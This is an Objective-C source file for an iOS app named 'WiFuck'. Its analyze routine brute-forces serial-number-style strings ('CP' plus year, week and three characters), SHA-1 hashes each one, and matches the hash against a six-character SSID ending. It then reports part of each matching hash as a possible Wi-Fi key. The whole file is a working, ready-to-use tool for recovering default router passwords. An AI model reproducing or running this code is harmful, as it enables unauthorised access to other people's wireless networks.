//
//  ViewController.m
//  WiFuck
//
//

#import "ViewController.h"
#import "NetworkChooserTableViewController.h"
#import <CommonCrypto/CommonDigest.h>

@interface ViewController ()

@end

@implementation ViewController

@synthesize textView;
@synthesize button;
@synthesize ssidText;

const char hex2asciiArr[256][2] =
{
    {'0','0'}, {'0','1'}, {'0', '2'}, {'0', '3'}, {'0', '4'}, {'0', '5'}, {'0', '6'}, {'0', '7'}, {'0', '8'}, {'0', '9'}, {'0', 'A'}, {'0', 'B'}, {'0', 'C'}, {'0', 'D'}, {'0', 'E'}, {'0', 'F'},
    {'1','0'}, {'1','1'}, {'1', '2'}, {'1', '3'}, {'1', '4'}, {'1', '5'}, {'1', '6'}, {'1', '7'}, {'1', '8'}, {'1', '9'}, {'1', 'A'}, {'1', 'B'}, {'1', 'C'}, {'1', 'D'}, {'1', 'E'}, {'1', 'F'},
    {'2','0'}, {'2','1'}, {'2', '2'}, {'2', '3'}, {'2', '4'}, {'2', '5'}, {'2', '6'}, {'2', '7'}, {'2', '8'}, {'2', '9'}, {'2', 'A'}, {'2', 'B'}, {'2', 'C'}, {'2', 'D'}, {'2', 'E'}, {'2', 'F'},
    {'3','0'}, {'3','1'}, {'3', '2'}, {'3', '3'}, {'3', '4'}, {'3', '5'}, {'3', '6'}, {'3', '7'}, {'3', '8'}, {'3', '9'}, {'3', 'A'}, {'3', 'B'}, {'3', 'C'}, {'3', 'D'}, {'3', 'E'}, {'3', 'F'},
    {'4','0'}, {'4','1'}, {'4', '2'}, {'4', '3'}, {'4', '4'}, {'4', '5'}, {'4', '6'}, {'4', '7'}, {'4', '8'}, {'4', '9'}, {'4', 'A'}, {'4', 'B'}, {'4', 'C'}, {'4', 'D'}, {'4', 'E'}, {'4', 'F'},
    {'5','0'}, {'5','1'}, {'5', '2'}, {'5', '3'}, {'5', '4'}, {'5', '5'}, {'5', '6'}, {'5', '7'}, {'5', '8'}, {'5', '9'}, {'5', 'A'}, {'5', 'B'}, {'5', 'C'}, {'5', 'D'}, {'5', 'E'}, {'5', 'F'},
    {'6','0'}, {'6','1'}, {'6', '2'}, {'6', '3'}, {'6', '4'}, {'6', '5'}, {'6', '6'}, {'6', '7'}, {'6', '8'}, {'6', '9'}, {'6', 'A'}, {'6', 'B'}, {'6', 'C'}, {'6', 'D'}, {'6', 'E'}, {'6', 'F'},
    {'7','0'}, {'7','1'}, {'7', '2'}, {'7', '3'}, {'7', '4'}, {'7', '5'}, {'7', '6'}, {'7', '7'}, {'7', '8'}, {'7', '9'}, {'7', 'A'}, {'7', 'B'}, {'7', 'C'}, {'7', 'D'}, {'7', 'E'}, {'7', 'F'},
    {'8','0'}, {'8','1'}, {'8', '2'}, {'8', '3'}, {'8', '4'}, {'8', '5'}, {'8', '6'}, {'8', '7'}, {'8', '8'}, {'8', '9'}, {'8', 'A'}, {'8', 'B'}, {'8', 'C'}, {'8', 'D'}, {'8', 'E'}, {'8', 'F'},
    {'9','0'}, {'9','1'}, {'9', '2'}, {'9', '3'}, {'9', '4'}, {'9', '5'}, {'9', '6'}, {'9', '7'}, {'9', '8'}, {'9', '9'}, {'9', 'A'}, {'9', 'B'}, {'9', 'C'}, {'9', 'D'}, {'9', 'E'}, {'9', 'F'},
    {'A','0'}, {'A','1'}, {'A', '2'}, {'A', '3'}, {'A', '4'}, {'A', '5'}, {'A', '6'}, {'A', '7'}, {'A', '8'}, {'A', '9'}, {'A', 'A'}, {'A', 'B'}, {'A', 'C'}, {'A', 'D'}, {'A', 'E'}, {'A', 'F'},
    {'B','0'}, {'B','1'}, {'B', '2'}, {'B', '3'}, {'B', '4'}, {'B', '5'}, {'B', '6'}, {'B', '7'}, {'B', '8'}, {'B', '9'}, {'B', 'A'}, {'B', 'B'}, {'B', 'C'}, {'B', 'D'}, {'B', 'E'}, {'B', 'F'},
    {'C','0'}, {'C','1'}, {'C', '2'}, {'C', '3'}, {'C', '4'}, {'C', '5'}, {'C', '6'}, {'C', '7'}, {'C', '8'}, {'C', '9'}, {'C', 'A'}, {'C', 'B'}, {'C', 'C'}, {'C', 'D'}, {'C', 'E'}, {'C', 'F'},
    {'D','0'}, {'D','1'}, {'D', '2'}, {'D', '3'}, {'D', '4'}, {'D', '5'}, {'D', '6'}, {'D', '7'}, {'D', '8'}, {'D', '9'}, {'D', 'A'}, {'D', 'B'}, {'D', 'C'}, {'D', 'D'}, {'D', 'E'}, {'D', 'F'},
    {'E','0'}, {'E','1'}, {'E', '2'}, {'E', '3'}, {'E', '4'}, {'E', '5'}, {'E', '6'}, {'E', '7'}, {'E', '8'}, {'E', '9'}, {'E', 'A'}, {'E', 'B'}, {'E', 'C'}, {'E', 'D'}, {'E', 'E'}, {'E', 'F'},
    {'F','0'}, {'F','1'}, {'F', '2'}, {'F', '3'}, {'F', '4'}, {'F', '5'}, {'F', '6'}, {'F', '7'}, {'F', '8'}, {'F', '9'}, {'F', 'A'}, {'F', 'B'}, {'F', 'C'}, {'F', 'D'}, {'F', 'E'}, {'F', 'F'},
};

char charset[36] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

char shaResult[50];
char hexResult[2];

char digitToChar(int digit)
{
    return (char)(((int)'0') + digit);
}

void intToHex(int num)
{
    hexResult[0] = hex2asciiArr[num][0];
    hexResult[1] = hex2asciiArr[num][1];
}


- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    [self.navigationController setNavigationBarHidden:YES];
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    [self setupImgeForButton];

    isAnalyzing = 0;
    logString = [[NSMutableString alloc] init];
    resultArray = [[NSMutableArray alloc] init];

}

- (void)setupImgeForButton
{
    UIImage *buttonImage = [[UIImage imageNamed:@"orangeButton.png"]
                            resizableImageWithCapInsets:UIEdgeInsetsMake(18, 18, 18, 18)];
    UIImage *buttonImageHighlight = [[UIImage imageNamed:@"orangeButtonHighlight.png"]
                                     resizableImageWithCapInsets:UIEdgeInsetsMake(18, 18, 18, 18)];
    // Set the background for any states you plan to use
    [button setBackgroundImage:buttonImage forState:UIControlStateNormal];
    [button setBackgroundImage:buttonImageHighlight forState:UIControlStateHighlighted];
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (BOOL)textFieldShouldReturn:(UITextField *)textField
{
    [ssidText resignFirstResponder];
    [self analyzePressed:nil];
    return YES;
}

void sha1(const char* str)
{
    unsigned char result[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(str, strlen(str), result);
    
    for (int i = 0; i < 20; i++)
    {
        intToHex(result[i]);
        shaResult[i * 2] = hexResult[0];
        shaResult[i * 2 + 1] = hexResult[1];
    }
    shaResult[40] = '\0';
}

-(void)logText:(NSString*)text
{
    [logString appendFormat:@"%@\r\n", text];
    [textView setText:logString];

    NSRange myRange=NSMakeRange(textView.text.length, 0);
    
    [textView scrollRangeToVisible:myRange];
}

-(void)logTextFromBackground:(NSString*)text
{
    [self performSelectorOnMainThread:@selector(logText:) withObject:text waitUntilDone:NO];
}

- (void)isStopRequested:(NSMutableArray*) parameterArray
{
    [parameterArray addObject:[NSNumber numberWithInt: isAnalyzing]];
}


- (IBAction)analyzePressed:(id)sender
{
    if (isAnalyzing)
    {
        [self logText:@"Stopping bruteforce process..."];
        isAnalyzing = 0;
        [sender setEnabled:NO];
    }
    else
    {
        [logString setString:@""];
        if (ssidText.text.length != 6)
        {
            [self logText:@"Invalid SSID ending. 6 characters expected!"];
            return;
        }
        
        isAnalyzing = 1;
        [sender setTitle:@"Stop" forState:UIControlStateNormal];
        [self logText:[NSString stringWithFormat:@"Running bruteforce analyzer for SSID ending %@...", ssidText.text.uppercaseString]];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [self analyze]; // 1
            dispatch_async(dispatch_get_main_queue(), ^{
                [self finished]; // 2
            });
        });
    }
}

- (BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string
{
    if (range.location <= 5 || [string isEqualToString:@""])
        return YES;

    [self logText:@"Invalid SSID ending. 6 characters expected!"];
    return NO;
}

- (void)analyze
{
    //fe8e1d
    NSString* ssid_end = ssidText.text;
    unsigned long offset = 40 - (ssid_end.length);
    const char* ssid = ssid_end.uppercaseString.UTF8String;
    
    [resultArray removeAllObjects];
    
    int yearList[8] = { 5,6,7,8,9,10,11,12 };
    
    NSMutableArray *weekList = [[NSMutableArray array] retain];
    for(int i=1; i < 53; i++)
    {
        [weekList addObject:@(i)];
    }
    
    NSLog(@"Possible keys for SSID ending %@:", ssid_end.uppercaseString);
    unsigned int count = 0;
    
    for (int yearIndex = 0; yearIndex < 8; yearIndex++)
    {
        int year = yearList[yearIndex];

        NSString* logStr = [NSString stringWithFormat:@"Trying year 20%02d", year];
        [self logTextFromBackground:logStr];

        for (NSNumber *w in weekList) // 1..52
        {
            NSMutableArray* parameterArray = [[NSMutableArray alloc] init];
            [self performSelectorOnMainThread:@selector(isStopRequested:) withObject:parameterArray waitUntilDone:YES];
            if ([parameterArray count] == 1)
            {
                int result = [[parameterArray objectAtIndex: 0] intValue];
                if (result)
                {
                    int week = [w intValue];

                    for (int char1 = 0; char1 < 36; char1++)
                    {
                        for (int char2 = 0; char2 < 36; char2++)
                        {
                            for (int char3 = 0; char3 < 36; char3++)
                            {
                                char buff[14];
                                buff[0] = 'C';
                                buff[1] = 'P';
                                buff[2] = digitToChar(year / 10);
                                buff[3] = digitToChar(year % 10);
                                buff[4] = digitToChar(week / 10);
                                buff[5] = digitToChar(week % 10);
                                intToHex(charset[char1]);
                                buff[6] = hexResult[0];
                                buff[7] = hexResult[1];
                                intToHex(charset[char2]);
                                buff[8] = hexResult[0];
                                buff[9] = hexResult[1];
                                intToHex(charset[char3]);
                                buff[10] = hexResult[0];
                                buff[11] = hexResult[1];
                                buff[12] = '\0';
                                
                                sha1(buff);
                                
                                BOOL isEqual = YES;
                                int index = 0;
                                while (ssid[index] != '\0')
                                {
                                    if (ssid[index] != shaResult[offset + index])
                                    {
                                        isEqual = NO;
                                    }
                                    index++;
                                }
                                
                                if (isEqual)
                                {
                                    shaResult[10] = '\0';
                                    NSString *resStr = [NSString stringWithCString:shaResult encoding:NSASCIIStringEncoding];
                                    
                                    NSString* subLogStr = [NSString stringWithFormat:@"Found: %@", resStr];
                                    NSLog(@"%@", subLogStr);
                                    [self logTextFromBackground:subLogStr];
                                    [resultArray addObject:resStr];
                                    
                                    count += 1;
                                }
                            }
                        }
                    }
                }
                else
                {
                    return;
                }
            }
            [parameterArray release];
        }
    }
    
    
    
    NSString* logStr = [NSString stringWithFormat:@"%d possible key(s) found:", count];
    NSLog(@"%@", logStr);
    [self logTextFromBackground:logStr];
    
    for (NSString* str in resultArray)
    {
        [self logTextFromBackground:str];
    }
    isAnalyzing = 0;
    [weekList release];
}

- (void)finished
{
    [self logText:@"Done."];
    [button setEnabled:YES];
    [button setTitle:@"Bruteforce" forState:UIControlStateNormal];
}

- (void)dealloc {
    [textView release];
    [button release];
    [ssidText release];
    [logString release];
    [resultArray release];
    [super dealloc];
}

- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    if ([segue.identifier isEqualToString:@"SelectNetwork"]) {
        NetworkChooserTableViewController *vc = segue.destinationViewController;
        vc.delegate = self;
    }
}

- (void)networkSelected:(NSString *)string
{
    self.ssidText.text = string;
}
@end
